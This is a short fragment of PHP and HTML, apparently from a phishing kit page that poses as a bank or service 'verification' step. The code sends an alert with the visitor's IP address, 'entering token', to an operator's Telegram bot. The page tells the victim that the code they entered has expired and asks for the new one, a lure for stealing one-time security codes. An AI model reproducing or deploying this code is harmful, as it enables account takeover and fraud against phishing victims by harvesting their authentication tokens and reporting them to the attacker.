...
if (isset($_SERVER['REMOTE_ADDR'])) {
    ...
    $alerta = "¡INGRESANDO TOKEN! $ip";
   $send_message = file_get_contents("https://api.telegram.org/bot".$key."/sendMessage?chat_id=".$id."&text=".urlencode($alerta));
  ...
  <div class="h-100 w-100 d-flex justify-content-center align-items-center">
    <div class="verificacion mx-auto">
      ...
      <div class="px-3">
        ...
        <p style="color: red;">* El código ingresado anteriormente se encuentra vencido. Por favor digite el nuevo código que le enviamos.</p>
      </div>
